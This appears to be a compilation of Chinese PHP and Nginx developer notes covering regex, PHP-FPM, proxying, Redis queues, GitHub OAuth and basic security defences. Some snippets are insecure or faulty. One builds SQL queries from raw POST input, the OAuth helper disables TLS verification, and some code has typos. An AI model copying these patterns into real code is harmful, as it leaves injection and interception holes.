Token 加入到黑名单。简单科普下非对称式加密算法：有两个密钥，一个公开密钥和一个私有密钥，私钥参与加密，公钥用于解密，巧妙之处是解密只能用公钥来解，即便是加密用的密钥也无法对密文进行解密。你可以看到加密和解密需要两个不同的密钥，故称之为非对称加密。https://learnku.com/articles/28909#reply91329 PHP-FPM 创建慢日志1234567891011121314151617181920212223242526272829303132333435363738394041CGI: 是一个协议，规定了 Web 服务器和后端语言的交互。但是性能差点，每个请求都会 fork 一个新的进程。\FastCGI: 也是一个协议，是 CGI 的升级版，可以在一个进程内处理多个请求 \FPM：FastCGI 进程管理器，是一个实现了 FastCGI 协议的工具 \PHP-FPM: 是一个 PHP 的进程管理器，专门给 PHP 使用的 FPM 工具 \ Nginx 并不是直接和 PHP 进行通信的，而是通过 PHP-FPM。Nginx 不仅仅是一个强大的 Web 服务器，也是一个强大的代理服务器，提供了很多请求协议的代理。比如 Http 协议还有 FastCgi 协议等。当请求进入到 Nginx 中，Nginx 提供了一个 FastCgi 模块 来把 Http 请求映射为对应的 Fastcgi 请求。该模块提供了 fastcgi_param 指定来完成映射关系。它的主要作用就是把 Nginx 中的变量翻译成 PHP 中能够理解的变量。 一般该文件是在 Nginx 的安装目录下，我的内容如下:/etc/nginx # cat /etc/nginx/fastcgi_params fastcgi_param QUERY_STRING $query_string;fastcgi_param REQUEST_METHOD $request_method;fastcgi_param CONTENT_TYPE $content_type;.php 结尾的请求都交给 fastcgi 模块处理，然后把处理后的请求发送给 PHP-FPM，然后 PHP-FPM 把请求交给 worker 进程，worker 进程加载 PHP 解析器运行 PHP 处理结果。 其中 fastcgi_pass unix:/var/run/php/php7.1-fpm.sock; 这一行用来指定 fpm 的地址Nginx 和 PHP 的通信流程大概如下。客户端发送请求到 Nginx加载 nginx.conf 文件，把所有 .php 结尾的请求特殊处理加载 FastCGI 模块，完成请求参数的解析映射，生成 FastCGI 请求然后通过 fastcgi_pass 参数把 FastCGI 请求发送给 PHP-FPM 处理PHP-FPM 收到请求，分配给空闲 worker 子进程worker 子进程加载 PHP 解析器等 完成 PHP 执行获取结果PHP-FPM 是一种 master/worker 进程架构。首先会启动一个 master 主进程，主要功能用来完成 PHP 环境的初始化，事件监听，子进程状态管理等等。然后会启动若干 worker 子进程来处理 PHP 请求测试 php-fpm 配置内容是否正确 使用 -t 参数， 还可以通过加 -c 指定 php.ini 文件，通过 -y 指定 php-fpm.conffind / -name php-fpm7/etc/init.d/php-fpm7/etc/logrotate.d/php-fpm7/usr/sbin/php-fpm7/usr/sbin/php-fpm7 -c /usr/local/php/etc/php.ini -y /usr/local/php/etc/php-fpm.conf -t去看 PHP-FPM 的错误日志。在 php-fpm.conf 中增加 error_log = /xx/xx/php-fpm.error.log, 然后重启 PHP-FPM，在访问测试连接请求，发现果然有报错[17-May-2019 10:04:50] NOTICE: fpm is running, pid 12[17-May-2019 10:04:50] NOTICE: ready to handle connections[17-May-2019 10:05:04] ERROR: failed to ptrace(ATTACH) child 22: Operation not permitted (1)[17-May-2019 10:05:04] WARNING: [pool www123] child 22, script '/app/www/public/index.php' (request: "GET /index.php") executing too slow (2.317563 sec), logging显示子进程权限不够，ptrace 调用失败！ master 进程为了监控子进程需要调用 ptrace 来实现对子进程监控和追踪，但是调用 ptrace 却失败了 https://learnku.com/articles/28683 正则表达式之难点123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154断言 ?&lt;= 这个是对需要匹配的目标左边的（前面）的进行断言，断定它前面会出现的 但是不会被匹配到。如：$subject = 'I am Lancer, Please say hello Lancer';//目标： 我要把hello 后面的Lancer 改为 '!' .$pattern = '/(?&lt;=hello )Lancer/';$result = preg_replace($pattern, '', $subject);echo $result; //I am Lancer, Please say hello !这样就成功咯~?=,与上面的位置刚好相反，这个是对需要匹配的目标右边的（后面）的进行断言，断定它后面会出现的 但是不会被匹配到。如：$subject = 'I love you! I love her too!';//目标：不能爱这么多， 把第二个 'love' 改为 'hate'$pattern = '/love(?= her)/';$result = preg_replace($pattern, 'hate', $subject);echo $result; //'I love you! I hate her too!'?&lt;!这个是需要对匹配左边的（前面的）进行断言，不过它是非，找到不是这个的。还是拿第一个例子来说：$subject = 'I am Lancer, Please say hello Lancer';//目标： 我还是要把hello 后面的Lancer 改为 '!' 该怎么做$pattern = '/(?&lt;!am )Lancer/'; //找到‘Lancer’前面不是'am '的'Lancer'$result = preg_replace($pattern, '', $subject);echo $result; //I am Lancer, Please say hello !?!还是一样的秘方，还是一样的味道~$subject = 'I love you! I love her too!';//目标：不能爱这么多， 把第二个 'love' 改为 'hate'$pattern = '/love(?! you)/';$result = preg_replace($pattern, 'hate', $subject);echo $result; //'I love you! I hate her too!'总结：这个断言，作用主要在，对于很多同样的目标，可是我只要其中的一个，或者多个的时候，那么就可以根据它的前面和后面，进行断言，来区分他们找到自己想要匹配的目标。捕获 先来说一下， 什么叫捕获。就是匹配之后，会根据你正则表达式中的（）来进行分组。一一捕获。打个比方：//为了显示方便，写了个show函数function show($str)&#123; if (empty($str)) &#123; echo null; &#125; elseif (is_array($str) || is_object($str)) &#123; echo '&lt;pre&gt;'; print_r($str); echo '&lt;/pre&gt;'; &#125; else &#123; echo $str; &#125;&#125;//--------------------------------------------------------------------$subject = '12323abcdea1233';$pattern = '/(a)(b)(c)(d)(e)/';preg_match_all($pattern, $subject, $matches);show($matches);&gt;&gt;&gt; $matches =&gt; [ [ "abcde", ], [ "a", ], [ "b", ], [ "c", ], [ "d", ], [ "e", ], ] //这个答案，大家应该都知道吧。索引为0的是整个match的内容，接着的//就是捕获的每一个（）分组的内容。我们还可以这样来写：$subject = '123abcabc123';$pattern = '/(a)(b)(c)(\1)(\2)(\3)/';preg_match_all($pattern, $subject, $matches);show($matches);//??先看答案：Array( [0] =&gt; Array ( [0] =&gt; abcabc ) [1] =&gt; Array ( [0] =&gt; a ) [2] =&gt; Array ( [0] =&gt; b ) [3] =&gt; Array ( [0] =&gt; c ) [4] =&gt; Array ( [0] =&gt; a ) [5] =&gt; Array ( [0] =&gt; b ) [6] =&gt; Array ( [0] =&gt; c ))//你可能会有疑问， 咦,,, 怎么(\1)和(a)， (\2)和(b)，(\3)和(c) 在正则里是一样的呢？//其实 (a)就是指的第一组, 然后后面就可以用(\1)来表示。(b),(c)也一样。有人可能就会问了， 那你写这个的作用又是什么呢 ？ 获取这些括号里的干啥。。 我只要第一个索引的匹配就够了呀。但是， 你考虑到了替换这个因素没？ 如果我替换的时候需要（）的东西呢？ 这个时候，我们就可以用到捕获到的（）的东西来穿插。不知道有人好奇过没，为什么用那些TP框架，Laravel框架， 或者smarty 在模版里写的&#123;&#123;$msg&#125;&#125;为什么也能输出呢？ 其实就是用了正则替换~ 看代码：$msg = "正则捕获";$subject = '&lt;p&gt;&#123;&#123;$msg&#125;&#125;&lt;/p&gt;';$pattern = '/\&#123;\&#123;(.*/)\&#125;\&#125;/'; //因为正则里也有'&#123;' 和'&#125;'所以需要用‘\’转义$result = preg_replace($pattern, '&lt;?php echo $1; ?&gt;', $subject);show($result); // &lt;p&gt;&lt;?php echo $msg;?&gt;&lt;/p&gt; //成功修改~上面说的是捕获， 但是我可能不想捕获怎么办？ 那么就可以用(?:) 在前面加上?:即可。注意， 这个不会影响匹配 只会影响捕获。 如：$subject = 'abc';$pattern = '/(a)(?:b)(c)/';preg_match_all($pattern, $subject, $matches);show($matches);//结果：Array( [0] =&gt; Array ( [0] =&gt; abc ) [1] =&gt; Array ( [0] =&gt; a ) [2] =&gt; Array ( [0] =&gt; c ))//看 匹配的结果让然是'abc' 不过没有捕获到 'b'https://coffeephp.com/articles/5 S.O.I.L.D 之接口隔离1234567891011121314151617181920212223242526272829303132333435363738394041424344454647https://learnku.com/articles/29130interface WorkableInterface&#123; public function work();&#125;interface ManageableInterface&#123; public function beManaged();&#125;class HumanWorker implements WorkableInterface, SleepableInterface, ManageableInterface&#123; public function work() &#123; return 'human working.'; &#125; public function sleep() &#123; return 'human sleeping'; &#125; public function beManaged() &#123; $this-&gt;work(); $this-&gt;sleep(); &#125;&#125;class AndroidWorker implements WorkableInterface, ManageableInterface&#123; public function work() &#123; return 'android working.'; &#125; public function beManaged() &#123; $this-&gt;work(); &#125;&#125;保持 Captain 类的封闭性class Captain&#123; public function manage(ManageableInterface $worker) &#123; $worker-&gt;beManaged(); &#125;&#125; array_map12345678910111213141516171819$pieces = [];foreach($whole as $item)&#123; $pieces[] = $item['foo'];&#125;return $pieces;return array_map( function ($item) &#123; return $item['foo']; &#125;, $whole);但需要遍历 Key =&gt; Value 形式的关联数组，该怎么操作呢？return array_map( function callback($k, $v) &#123; ... &#125;, array_keys($array), $array);https://wi1dcard.cn/posts/php-array-map-instead-of-foreach/ intval() 与 (int)123456789101112131415$int = intval('0123', 8); // == 83$test_int = 12;$test_float = 12.8;$test_string = "12";echo (int) $test_int; // == 12echo (int) $test_float; // == 12echo (int) $test_string; // == 12echo intval($test_int, 8); // == 12echo intval($test_float, 8) // == 12echo intval($test_string, 8); // == 10intval() 会将类型已经是 int 或 float 的数据当作「无需转换」而直接返回！所以如上，$test_int 和 $test_float 并没有按照八进制转换，使用时一定需要注意避免踩坑。 json_encode() 序列化非公开属性12345678910111213141516171819202122232425class Foo implements \JsonSerializable&#123; public $fooProperty; protected $barProperty; public function jsonSerialize() &#123; return [ 'fooProperty' =&gt; $this-&gt;fooProperty, 'barProperty' =&gt; $this-&gt;barProperty, ]; &#125;&#125;class Foo implements \JsonSerializable&#123; public $fooProperty; protected $barProperty; public function jsonSerialize() &#123; return get_object_vars($this); &#125;&#125;https://wi1dcard.cn/posts/json-encode-non-public-properties/ PHP 引用详解123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960$catList = [ '1' =&gt; ['id' =&gt; 1, 'name' =&gt; '颜色', 'parent_id' =&gt; 0], '2' =&gt; ['id' =&gt; 2, 'name' =&gt; '规格', 'parent_id' =&gt; 0], '3' =&gt; ['id' =&gt; 3, 'name' =&gt; '白色', 'parent_id' =&gt; 1], '4' =&gt; ['id' =&gt; 4, 'name' =&gt; '黑色', 'parent_id' =&gt; 1], '5' =&gt; ['id' =&gt; 5, 'name' =&gt; '大', 'parent_id' =&gt; 2], '6' =&gt; ['id' =&gt; 6, 'name' =&gt; '小', 'parent_id' =&gt; 2], '7' =&gt; ['id' =&gt; 7, 'name' =&gt; '黄色', 'parent_id' =&gt; 1],];$treeData = [];foreach ($catList as $item) &#123; if (isset($catList[$item['parent_id']]) &amp;&amp; !empty($catList[$item['parent_id']])) &#123; // 子分类 $catList[$item['parent_id']]['children'][] = &amp;$catList[$item['id']]; &#125; else &#123; // 一级分类 $treeData[] = &amp;$catList[$item['id']]; &#125;&#125;=&gt; [ [ "id" =&gt; 1, "name" =&gt; "颜色", "parent_id" =&gt; 0, "children" =&gt; [ [ "id" =&gt; 3, "name" =&gt; "白色", "parent_id" =&gt; 1, ], [ "id" =&gt; 4, "name" =&gt; "黑色", "parent_id" =&gt; 1, ], [ "id" =&gt; 7, "name" =&gt; "黄色", "parent_id" =&gt; 1, ], ], ], [ "id" =&gt; 2, "name" =&gt; "规格", "parent_id" =&gt; 0, "children" =&gt; [ [ "id" =&gt; 5, "name" =&gt; "大", "parent_id" =&gt; 2, ], [ "id" =&gt; 6, "name" =&gt; "小", "parent_id" =&gt; 2, ], ], ], ] 封装代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899if (IS_POST) &#123; $like = ''; if (isset($_POST['username'])) &#123; $username = $_POST['username']; $like .= "username like '%" . $username . "%' and "; &#125; if (isset($_POST['phone'])) &#123; $phone = $_POST['phone']; $like .= "phone like '%" . $phone . "%' and"; &#125; if ($_POST['is_auth']) &#123; $isAuth = $_POST['is_auth']; $like .= "is_auth like '%" . $isAuth . "%' and"; &#125; if ($_POST['sex']) &#123; $sex = $_POST['sex']; $like .= "sex like '%" . $sex . "%' and"; &#125; if ($_POST['time']) &#123; $time = $_POST['time']; $like .= "time like '%" . $time . "%' and"; &#125; if ($_POST['wallet']) &#123; $wallet = $_POST['wallet']; $like .= "wallet like '%" . $wallet . "%' and"; &#125; $like = rtrim($like, 'and'); $sql = "SELECT * FROM `user` WHERE &#123;$like&#125;";&#125; else &#123; return view('user');&#125;function request($param = null)&#123; return new Request($param);&#125;class Request&#123; public function __construct(string $param = null) &#123; return isset($_POST[$param]) ? $_POST[$param] : false; &#125; public function all() &#123; return $_POST; &#125;&#125;class User&#123; public $request = [ 'username', 'phone', 'is_auth', 'sex', 'time', 'wallet' ]; public function index() &#123; if (IS_POST) &#123; $like = ''; foreach (request()-&gt;all() as $key =&gt; $value) &#123; if (in_array($key, $this-&gt;request) &amp;&amp; request($key)) &#123; $like .= sprintf("%s like %s and", $key, $value); //$like[] = sprintf("%s like %s", $key, $value); &#125; &#125; //$sql = implode(" AND ", $like); $like = rtrim($like, 'and'); $sql = "SELECT * FROM `user` WHERE &#123;$like&#125;"; &#125; else &#123; return view('user'); &#125; &#125;&#125;https://github.com/CrazyCodes/Blog/blob/master/%E6%88%91%E4%B8%8EJetbrains%E7%9A%84%E8%BF%99%E4%BA%9B%E5%B9%B4.mdhttps://segmentfault.com/a/1190000019274366 无限极分类树1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798array( 1 =&gt; array( 'id' =&gt; 1, 'name' =&gt; '中华人民共和国', 'parent_id' =&gt; 0, 'level' =&gt; 'country', ), 2 =&gt; array( 'id' =&gt; 2, 'name' =&gt; '北京市', 'parent_id' =&gt; 1, 'level' =&gt; 'province', ), 20 =&gt; array( 'id' =&gt; 20, 'name' =&gt; '天津市', 'parent_id' =&gt; 1, 'level' =&gt; 'province', ), 38 =&gt; array( 'id' =&gt; 38, 'name' =&gt; '河北省', 'parent_id' =&gt; 1, 'level' =&gt; 'province', ), 218 =&gt; array( 'id' =&gt; 218, 'name' =&gt; '山西省', 'parent_id' =&gt; 1, 'level' =&gt; 'province', ), 349 =&gt; array( 'id' =&gt; 349, 'name' =&gt; '内蒙古自治区', 'parent_id' =&gt; 1, 'level' =&gt; 'province', ), 465 =&gt; array( 'id' =&gt; 465, 'name' =&gt; '辽宁省', 'parent_id' =&gt; 1, 'level' =&gt; 'province', ), ...);优化前/*** 获取以父级 ID 为 $parent_id 为根节点的树型结构数组** @param array $arr* @param int $level 树型当前层* @param int $parent_id 父级id* @param int $floor 树型总层数* @return array*/public static function getList(&amp;$arr, $level = 0, $parent_id = 1, $floor = 3)&#123; if ($level != 0) &#123; $empty = $arr[$parent_id]; $empty['list'] = []; $emptyPointer = &amp;$empty['list']; &#125; else &#123; $empty = []; $emptyPointer = &amp;$empty; &#125; if ($level &lt; $floor) &#123; $ok = false; foreach ($arr as $index =&gt; &amp;$item) &#123; if ($item['parent_id'] == $parent_id) &#123; $data = self::getList($arr, $level + 1, $index); array_push($emptyPointer, $data); $ok = true; &#125; if ($ok &amp;&amp; $item['parent_id'] != $parent_id) &#123; break; &#125; &#125; &#125; return $empty;&#125;优化后https://wi1dcard.cn/posts/php-fastest-create-tree-from-list/public static function getList($catList)&#123; $treeData = []; foreach ($catList as &amp;$item) &#123; $parent_id = $item['parent_id']; if (isset($catList[$parent_id]) &amp;&amp; !empty($catList[$parent_id])) &#123; $catList[$parent_id]['list'][] = &amp;$catList[$item['id']]; &#125; else &#123; $treeData[] = &amp;$catList[$item['id']]; &#125; &#125; unset($item); return $treeData[0]['list']; // 根节点只有中华人民共和国，所以直接返回中国的所有子节点&#125; 代理与反向代理、负载均衡和缓存123456789101112131415161718192021222324252627282930313233343536373839404142434445代理（正向代理，目标服务器不知道谁在访问）位于客户端和目标服务器之间，起到一个中转的作用。其实就是客户端想访问目标服务器，但是因为某些原因不能够直接访问，则把请求和目标服务器发给代理服务器，代理服务器再去请求目标服务器，把返回的响应结果返回给客户端。反向代理（用户实际并不知道最终服务器，只是访问一个反向代理服务器而已）客户端会把反向代理服务器当成目标服务器，向反向代理服务器发送请求后，反向代理服务器再请求内部的后端服务器，把得到的响应结果返回给客户端。server&#123;listen 80; server_name test.test; #将本机接收到的test.test的请求全部转发到另外一台服务器192.168.78.128 location /&#123; proxy_pass http://192.168.78.128; #下面是其他辅助指令 proxy_set_header Host $host; #更改来自客户端的请求头信息 proxy_set_header X-Real_IP $remote_addr; #用户真实访问ip proxy_connect_timeout 2; #配置nginx与后端服务器建立连接的超时时间 proxy_read_timeout 2; #配置nginx向后端发出read请求的等待响应超时时间 proxy_send_timeout 2; #配置nginx向后端服务器发出write请求的等待响应超时时间 proxy_redirect http://www.baidu.com; #用于修改后端服务器返回的响应头中的Location和Refresh &#125;&#125;用户不直接访问后端服务器，而是访问负载均衡服务器，由负载均衡服务器再次转发到后端服务器。如果这个时候有一台后端服务器挂掉了，那么负载均衡服务器会剔除掉它，将后续请求都转发到好的那台，这样就不影响网站的正常运行server&#123; listen 80; server_name test.test; location / &#123; proxy_pass http://web_server; #反向代理 &#125;&#125;#配置负载均衡服务器组upstream web_server &#123; server 192.168.78.128; server 192.168.78.129;&#125;#配置负载均衡服务器组upstream web_server &#123; server 192.168.78.128 weight=1; server 192.168.78.129 weight=3;&#125;这里面的权值总和为一个循环，这里以 4 次为一个循环，那么就是每四次请求中，三次会被分派到 129 这个服务器，一次分配到 128，但是具体三次并不会顺序执行，而是按照算法分散执行。https://learnku.com/articles/26686 https://learnku.com/articles/29231#reply92298 Swoole,Redis list实现简单消息推送1234567891011121314151617181920212223242526272829303132333435swoole.php&lt;?php$server = new swoole_websocket_server("0.0.0.0", 9502);$server-&gt;on('workerStart', function ($server, $workerId) &#123; $redis = new Swoole\Coroutine\Redis(); $redis-&gt;connect('127.0.0.1', 6379); while (true) &#123; // brpop 第二个参数 50 表示超时（阻塞等待）时间, blpop 同理，详情建议读文档,对应的 redis 操作是 rpush/lpush key content if (($message = $redis-&gt;brpop('message', 50)) === null) &#123; continue; &#125; // var_dump($message); 结果为数组 foreach ($server-&gt;connections as $fd) &#123; $server-&gt;push($fd, 'redis 的 ' . $message[0] . ' 队列发送消息:' . $message[1]); &#125; &#125;&#125;);$server-&gt;on('open', function ($server, $request) &#123; $server-&gt;push($request-&gt;fd, "hello;\n");&#125;);$server-&gt;on('message', function (swoole_websocket_server $server, $request) &#123; $server-&gt;push($request-&gt;fd, "hello");&#125;);$server-&gt;on('close', function ($server, $fd) &#123; echo "client-&#123;$fd&#125; is closed\n"; $server-&gt;close($fd);&#125;);$server-&gt;start();//https://alpha2016.github.io/2019/02/16/PHP,Swoole,Redis-list%E5%AE%9E%E7%8E%B0%E6%B6%88%E6%81%AF%E6%8E%A8%E9%80%81/ Redis list队列异常崩溃123用 Redis list 做消息队列，在取出消息的时候 Redis 宕机，程序上的业务逻辑没执行，怎样处理？先不去考虑 Redis 的异常处理及恢复，一般主从哨兵机制很难崩溃，暂时考虑程序端如何处理这种直接使用 Redis 官方的 RPOPLPUSH / BRPOPLPUSH source destination 命令，在读取消息的同时，将读取到的消息内容放到目标队列，然后当前进程进行消费数据，消费成功，则 lrem destination 1 key 在目标队列中删除刚才的消息内容。 从0-n之间取k个不重复的数123456789101112131415161718192021222324252627282930313233343536使用 array 系列函数的方法function getRandomN($max, $num) &#123; $count = 0; $return = array(); while ($count &lt; $num) &#123; $return[] = mt_rand(0, $max); $return = array_flip(array_flip($return)); $count = count($return); &#125; shuffle($return); return $return;&#125;return getRandomN(20, 10);// output:[7,14,6,12,3,4,15,0,16,10]不使用 array 系列函数的方法function getRandomN($num, $n)&#123; $startArray = range(0, $num); $resultArray = []; for($i = 0; $i &lt; $n; $i++) &#123; $random = mt_rand(0, $num - $i); $resultArray[$i] = $startArray[$random]; $startArray[$random] = $startArray[$num - $i - 1]; &#125; return $resultArray;&#125;return getRandomN(20, 10);// output:[7,14,6,12,3,4,15,0,16,10]https://alpha2016.github.io/2019/04/09/PHP%E4%BB%8E0-n%E4%B9%8B%E9%97%B4%E9%9A%8F%E6%9C%BA%E5%8F%96k%E4%B8%AA%E4%B8%8D%E9%87%8D%E5%A4%8D%E7%9A%84%E6%95%B0/ 匿名函数123456789101112131415161718192021222324252627//声明一个狗对象class Dog&#123; public $name = '旺财';&#125;//声明一个猫对象class Cat&#123; public $name = '喵喵';&#125;//声明一个匿名函数，用来输出名字$sayName = function() &#123; echo $this-&gt;name;&#125;;//用bind赋值上面那个匿名函数，并指定this指向狗对象，返回新的闭包函数$sayDogName = Closure::bind($sayName, new Dog);//调用新的闭包函数，输出 “旺财”$sayDogName(); //指定类的作用域为 Dog 对象$sayDogName = Closure::bind($sayName, new Dog, 'Dog');//输出 “旺财”$sayDogName(); 数组整合合并12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788$a=[ [ "id"=&gt; 1, "name"=&gt; "std_name_0" ], [ "id"=&gt;2, "name"=&gt; "std_name_1" ], [ "id"=&gt; 3, "name"=&gt;"std_name_2" ], [ "id"=&gt; 4, "name"=&gt; "std_name_3" ], [ "id"=&gt; 5, "name"=&gt; "std_name_4" ]]$b=[[ "id"=&gt; 2, "order_count"=&gt;0 ], [ "id"=&gt; 3, "order_count"=&gt; 2 ], [ "id"=&gt;4, "order_count"=&gt; 4 ], [ "id"=&gt; 5, "order_count"=&gt;6 ], [ "id"=&gt; 6, "order_count"=&gt; 8 ], [ "id"=&gt; 7, "order_count"=&gt; 10 ], [ "id"=&gt;8, "order_count"=&gt; 12 ]]$users_info=[];foreach ($a as $val)&#123; $users_info[$val['id']]['id'] = $val['id']; $users_info[$val['id']]['name'] = $val['name']; $users_info[$val['id']]['order_count'] = 0;&#125;foreach ($b as $val)&#123; $users_info[$val['id']]['id'] = $val['id']; $users_info[$val['id']]['order_count'] = $val['order_count']; $users_info[$val['id']]['name'] = $users_info[$val['id']]['name']??'';&#125;&gt;&gt;&gt; $users_info=&gt; [ 1 =&gt; [ "id" =&gt; 1, "name" =&gt; "std_name_0", "order_count" =&gt; 0, ], 2 =&gt; [ "id" =&gt; 2, "name" =&gt; "std_name_1", "order_count" =&gt; 0, ], 3 =&gt; [ "id" =&gt; 3, "name" =&gt; "std_name_2", "order_count" =&gt; 2, ], 4 =&gt; [ "id" =&gt; 4, "name" =&gt; "std_name_3", "order_count" =&gt; 4, ],https://www.guaosi.com/2018/12/14/complex-two-dimensional-arrays/ 循环中查询数据库123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051foreach ( $product as $p) &#123; //如果存在则更新 if ( $this-&gt;count($p) ) &#123; $this-&gt;update($p); &#125; else &#123; $this-&gt;insert($p); &#125; &#125; $product = [ [ 'product_id'=&gt;1, 'pnid'=&gt;1, 'pvid'=&gt;10 ], [ 'product_id'=&gt;1, 'pnid'=&gt;3, 'pvid'=&gt;30 ], [ 'product_id'=&gt;1, 'pnid'=&gt;12, 'pvid'=&gt;21 ], [ 'product_id'=&gt;1, 'pnid'=&gt;31, 'pvid'=&gt;33 ], ]; //获取product_id为1的数据 $oldData = $this-&gt;get(1); /** * 这里会把数据组成以pnid为键的数组 */ $oldKeyData = array_column($oldData,NULL,'pnid'); $update = []; $insert = []; foreach ( $product as $p) &#123; if ( isset($oldKeyData[$p['pnid']]) ) &#123; $updatep[] = $p; &#125; eles &#123; $insert[] = $p; &#125; &#125; //进行更新和删除https://learnku.com/articles/29764 json排序123456789101112131415array:5 [ 6 =&gt; "中国" 5 =&gt; "美国" 4 =&gt; "日本" 1 =&gt; "俄罗斯" 2 =&gt; "英国"] return Response::send(0,'成功！',$data);data &#123;…&#125;1 俄罗斯2 英国4 日本5 美国6 中国每个数字 key 前面加个空格字符串即可。 数组排序1array_multisort(array_column($array,'sort'),SORT_ASC,$array); 图片上传添加自动裁剪123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960composer require intervention/imageIntervention\Image\ImageServiceProvider::class,'Image' =&gt; Intervention\Image\Facades\Image::class,php artisan vendor:publish --provider="Intervention\Image\ImageServiceProviderLaravel5"public function image_upload(Request $req)&#123;try &#123;if ($req-&gt;isMethod('POST')) &#123;$file = $req-&gt;file('file');// 图片宽度参数 可以写死也可传值接收 关闭 false$max_width = false;if ($file-&gt;isValid()) &#123;$realPath = $file-&gt;getRealPath ();// 临时文件路径 $entension = $file-&gt;getClientOriginalExtension();//上传文件后缀名 $time = date('Ym'); $newName = md5(uniqid(microtime(true), true)) . date('YmdHis') . '.' . $entension; $path = $file-&gt;move(base_path() . '/public/upload/image/' . $time, $newName); $filepath = '/upload/image/' . $time . '/' . $newName; // 图片物理路径 特别重要 如果路径则无法识别写入图片 $img = public_path().'/'.$filepath; // 图片剪裁逻辑 如果限制了图片宽度且不为gif格式，就进行裁剪 if ($max_width &amp;&amp; $entension != 'gif') &#123; // 此类中封装的函数，用于裁剪图片 $this-&gt;reduceSize($img, $max_width); &#125; return response()-&gt;json(['status' =&gt; 0, 'msg' =&gt; '上传成功', 'filepath' =&gt; $filepath]);&#125;&#125;&#125; catch (Exception $e) &#123;return $this-&gt;doFailure($e);&#125;;&#125;// 图片按宽度剪裁public function reduceSize($img, $max_width)&#123;// 先实例化，传参是文件的磁盘物理路径$image = Image::make($img);// 进行大小调整的操作$image-&gt;resize($max_width, null, function ($constraint) &#123;// 设定宽度是 $max_width，高度等比例双方缩放$constraint-&gt;aspectRatio();// 防止裁图时图片尺寸变大$constraint-&gt;upsize();&#125;);// 对图片修改后进行保存$image-&gt;save();&#125;` 快速接入 GitHub 登陆123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869/** * 发送请求(也可以直接使用guzzle) *https://learnku.com/articles/29160 * @param string $url 请求地址 * @param array $data 请求数据 * @param array $headers 请求头 * @return string|array */function sendRequest($url, $data = [], $headers = [])&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); if (!empty($data)) &#123; curl_setopt($ch, CURLOPT_TIMEOUT, 60); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, $data); &#125; $response = curl_exec($ch) ? curl_multi_getcontent($ch) : ''; curl_close($ch); return $response;&#125;// 如果用户同意登陆， github 就会返回到 callback.php 并携带一个code参数// 此时只需要使用这个 code 去获取 access_token, 然后在使用 access_token 获取用户信息$url = "https://github.com/login/oauth/access_token";$app_id = "your github oauth app client_id";$app_secret = "your github oauth app client_secret";// 组合请求参数$code = $_GET['code'];$params = [ 'client_id' =&gt; $app_id, 'client_secret' =&gt; $app_secret, 'code' =&gt; $code,];// 发送请求并获取响应信息$response = sendRequest($url, $params, ['Accept: application/json']);$response = json_decode($response, true);// 如果有响应信息， 说明请求成功if (!empty($response['access_token'])) &#123; // 请求成功，使用 access_token 获取用户信息 $access_token = $response['access_token']; $url = "https://api.github.com/user"; // 发送请求，调取github API 获取用户信息 $userInfo = sendRequest($url,[],[ "Accept: application/json", "User-Agent: ilearn", // 此处(ilearn)是填写应用名称 或者 github用户名 "Authorization:token &#123;$access_token&#125;" ]); exit($userInfo);&#125;// 如果登陆失败就打印错误信息echo "&lt;p&gt;登陆失败&lt;/p&gt;&lt;/pre&gt;";var_dump($response);exit("&lt;/pre&gt;");https://github.com/overtrue/laravel-socialite使用命令 composer require huoshaotuzi/sociate 安装，现在支持 QQ、微博、微信公众号、百度、Github 登录，以后有时间还会继续扩展更多的登录。https://learnku.com/laravel/t/24449 PHP 安全问题入门123456789101112131415161718192021222324252627282930313233343536SQL 注入$username = $_GET['username'];$query = $pdo-&gt;prepare('SELECT * FROM users WHERE username = :username');$query-&gt;execute(['username' =&gt; $username]);$data = $query-&gt;fetch();xss $searchQuery = htmlentities($searchQuery, ENT_QUOTES);XSRF/CSRF最常用的防御方法是生成一个 CSRF 令牌加密安全字符串，一般称其为 Token，并将 Token 存储于 Cookie 或者 Session 中。每次你在网页构造表单时，将 Token 令牌放在表单中的隐藏字段，表单请求服务器以后会根据用户的 Cookie 或者 Session 里的 Token 令牌比对，校验成功才给予通过密码哈希//user signup$password = $_POST['password'];$hashedPassword = password_hash($password, PASSWORD_DEFAULT);//login$password = $_POST['password'];$hash = '1234'; //load this value from your dbif(password_verify($password, $hash)) &#123; echo 'Password is valid!';&#125; else &#123; echo 'Invalid password.';&#125;密码哈希并不是密码加密。哈希（Hash）是将目标文本转换成具有相同长度的、不可逆的杂凑字符串（或叫做消息摘要），而加密（Encrypt）是将目标文本转换成具有不同长度的、可逆的密文。显然他们之间最大的区别是可逆性，在储存密码时，我们要的就是哈希这种不可逆的属性。命令注入$targetIp = escapeshellarg($_GET['ip']);$output = shell_exec("ping -c 5 $targetIp");像登录这样的敏感表单应该有一个严格的速率限制，以防止暴力攻击。保存每个用户在过去几分钟内失败的登录尝试次数，如果该速率超过你定义的阈值，则拒绝进一步登录尝试，直到冷却期结束。还可通过电子邮件通知用户登录失败，以便他们知道自己的账户被成为目标。https://learnku.com/php/t/24930#reply94655 内置 Web 服务器12345678910111213141516171819php -S localhost:8000 -t public/php -S localhost:8000 router.php/** * 对URL进行解析，并获取请求的文件名 */$uri = urldecode(parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH));/** * 判断是否存在该文件，如果不存在，则直接继续加载入口文件 */if ($uri !== "/" &amp;&amp; 